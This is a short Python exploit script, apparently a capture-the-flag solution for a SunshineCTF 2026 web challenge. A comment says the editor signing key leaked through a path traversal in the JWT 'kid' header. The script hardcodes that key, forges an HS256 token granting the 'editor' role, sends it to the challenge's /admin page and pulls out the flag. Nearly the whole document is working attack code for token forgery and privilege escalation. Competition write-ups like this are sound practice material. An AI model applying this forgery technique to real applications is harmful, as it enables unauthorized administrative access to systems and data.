import base64, hmac, hashlib, json, requests, re
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
# Editor signing key leaked via /admin 'Pass Inspector' path-traversal disclosure:
# kid=/app/app.py dumped the Flask source, which hardcodes EDITOR_KEY.
key=b'ch-pr0t0type-edit0r-s1gn1ng-k3y-d0-n0t-sh1p'
h=b64(json.dumps({'alg':'HS256','kid':'editor.key','typ':'JWT'},separators=(',',':')).encode())
p=b64(json.dumps({'sub':'reader','role':'editor'},separators=(',',':')).encode())
msg=(h+'.'+p).encode()
tok=h+'.'+p+'.'+b64(hmac.new(key,msg,hashlib.sha256).digest())
r=requests.get('https://kidding.web.2026.sunshinectf.games/admin',cookies={'token':tok})
print(r.status_code)
print(re.findall(r'sun\{[^}]+\}', r.text))
